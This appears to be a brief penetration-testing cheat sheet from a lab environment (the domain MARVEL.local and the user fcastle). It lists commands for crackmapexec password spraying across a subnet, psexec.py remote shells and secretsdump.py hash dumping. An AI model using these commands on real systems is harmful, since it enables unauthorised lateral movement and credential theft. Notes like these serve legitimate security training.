### crackmapexec

Use crackmapexec to pass the password around the network and see what other machines include this account

```bash
example: crackmapexec smb 192.168.16.0/24 -u fcastle -d MARVEL.local -p Password1
Usage: crackmapexec smb [ ip/CIDR] -u [username] -d [domain] -p [password]
```

### psexec
You can use this command to get a quick easy shell sometimes it works sometimes it doesn't

```bash
example: psexec.py marvel/fcastle:Password1@192.168.16.139
usage: psexec.py domain/username:password@[IP]
```

### secretsdump

Use this to dump hashes and maybe pass them around
```bash
example: secretsdump.py marvel/fcastle:Password1@192.168.16.129
usage: secretsdump.py domain/username:password@[IP]
```
